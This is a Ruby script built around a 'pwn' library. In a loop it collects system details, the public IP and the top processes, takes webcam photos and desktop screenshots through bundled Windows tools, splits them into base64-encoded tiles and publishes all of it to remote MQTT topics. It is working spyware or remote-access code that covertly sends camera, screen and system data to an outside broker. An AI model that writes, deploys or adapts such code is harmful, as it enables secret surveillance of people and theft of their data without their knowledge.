require_relative 'pwn'
require 'base64'
require 'json'
require 'os'
require 'open-uri'
require 'sys/proctable'
include Sys

p @ip = open('http://whatismyip.akamai.com').read

def host()
  { :host => OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip }
end

def ip()
  { :ip => @ip }
end

def os()
  { :os => (OS.windows? ? `ver` : `uname -sr`).strip }
end

def cpu()
  if OS.windows? then
    return {
      :cpu => `wmic cpu get name /format:value`.strip.split('=')[1],
      :cpu_usage => `wmic cpu get loadpercentage /format:value`.strip.split('=')[1]
    }
  else
      `echo 'implement in linux later'`
  end
end

def memory()
  if OS.windows? then
    mem_capacity = `wmic memorychip get capacity /format:value`.gsub(/\s/, "").split('Capacity=')
    mem_capacity.shift
    total_capacity = 0
    mem_capacity.each do |m|
      total_capacity += m.to_i
    end
    return {
      :total_capacity => total_capacity,
      :memory_usage => total_capacity - `wmic OS get FreePhysicalMemory /format:value`.gsub(/\s/, "").split('=')[1].to_i * 1000
    }
  else
    `whoami`
  end
end

def disk()
  if OS.windows? then
    drives = `wmic logicaldisk get size, freespace, caption`.strip.split("\n")
    drives.shift
    drives = drives.reject { |d| d.empty? }
    drives.map! do |d|
      d = d.gsub(/\s+/, ' ')
      d_info = d.split(' ')
      d = { :drive => d_info[0], :free_space => d_info[1], :size => d_info[2] }
    end
    return drives
  else
    `whoami`
  end
end

def network()
  if OS.windows? then
    network_adapters = `wmic path Win32_PerfRawData_Tcpip_NetworkInterface get BytesReceivedPersec, BytesSentPersec, Name /format:value`.strip.split("\n")
    network_adapters = network_adapters.reject { |n| n.empty? }
    network_adapters.map! do |n|
      n = n.gsub(/\s+/, ' ')
    end
    network = []
    (0...network_adapters.length).step(3) do |n|
      network.push({
        :bytes_rec_persec => network_adapters[n].split('=')[1],
        :bytes_sent_persec => network_adapters[n+1].split('=')[1],
        :adapter => network_adapters[n+2].split('=')[1]
      })
    end

    return network
  else
    `whoami`
  end
end

def processes()
  processes = []
  ProcTable.ps do |p|
    processes.push({ :pid => p.pid, :name => p.comm, :user => '', :cpu => '', :mem => p.working_set_size })
  end

  processes.sort_by { |p| p[:mem] }
  return processes.last(10)
end

def webcam()
  if OS.windows? then
    `WebCamImageSave.exe /capture /Filename webcam.png`
    `magick mogrify -resize 50% webcam.png`
    `magick convert -crop 10%x10% webcam.png webcam/webcam%d.png`
  else
    `whoami`
  end
end

def desktop()
  if OS.windows? then
    `nircmd.exe savescreenshot desktop.png`
    `magick mogrify -resize 50% desktop.png`
    `magick convert -crop 10%x10% desktop.png desktop/desktop%d.png`
  else
    `whoami`
  end
end

pwn = Pwn.new

# pwn.add_topic_callback('reedleoneil/#') do |message|
# 	if message.payload != '' then
# 	  puts message.topic
# 	  pwn.internals[:mqtt].publish(message.topic, nil, true, 2)
# 	end
# end

last_ping_time_host_ip_os = Time.now
last_ping_time_cpu_memory = Time.now
last_ping_time_disk_network_process = Time.now
last_ping_time_webcam_desktop = Time.now
loop do
	begin
		if pwn.internals[:mqtt].connected? then
			pwn.internals[:mqtt].mqtt_loop
      if last_ping_time_host_ip_os <= Time.now - 300 then
        pwn.publish('reedleoneil/system_info/host', host().to_json)
        pwn.publish('reedleoneil/system_info/ip', ip().to_json, true, 2)
        pwn.publish('reedleoneil/system_info/os', os().to_json, true, 2)
        last_ping_time_host_ip_os = Time.now
			end

      if last_ping_time_cpu_memory <= Time.now - 3 then
        pwn.publish('reedleoneil/system_info/cpu', cpu().to_json, true, 2)
        pwn.publish('reedleoneil/system_info/memory', memory().to_json, true, 2)
        last_ping_time_cpu_memory = Time.now
			end

      if last_ping_time_disk_network_process <= Time.now - 30 then
        pwn.publish('reedleoneil/system_info/disk', disk().to_json, true, 2)
        pwn.publish('reedleoneil/system_info/network', network().to_json, true, 2)
        pwn.publish('reedleoneil/system_info/processes', processes().to_json, true, 2)
        last_ping_time_disk_network_process = Time.now
			end

      if last_ping_time_webcam_desktop <= Time.now - (30 * 3) then
        webcam()
        (0..99).each do |i|
           w = Base64.strict_encode64(File.binread('webcam/webcam' + i.to_s + '.png'))
           pwn.publish('reedleoneil/webcam', w, false, 2)
        end
        desktop()
        (0..99).each do |i|
           d = Base64.strict_encode64(File.binread('desktop/desktop' + i.to_s + '.png'))
           pwn.publish('reedleoneil/desktop', d, false, 2)
        end
        last_ping_time_webcam_desktop = Time.now
			end
		else
			pwn.connect() if !pwn.connecting?
		end
	rescue StandardError => error
		puts error.full_message
			pwn.connect() if !pwn.connecting?
	end
end
